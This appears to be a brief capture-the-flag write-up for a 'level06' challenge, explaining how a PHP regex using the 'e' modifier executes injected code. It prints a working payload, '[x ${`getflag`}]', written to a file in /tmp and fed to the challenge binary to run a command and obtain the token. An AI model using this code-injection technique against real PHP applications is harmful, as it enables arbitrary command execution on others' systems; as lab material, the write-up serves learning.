
We have a php file where we can see a regex expression with the flag `e` that allows us to execute php code:

``` php
cat level06.php
```

The program will take the content of the given file, and execute a group of regular expressions on the content of the file, so if we put `[x ${getflag}]` inside we will get the token:

``` shell
echo '[x ${`getflag`}]' > /tmp/execute.me
```

``` shell
./level06 /tmp/execute.me
```

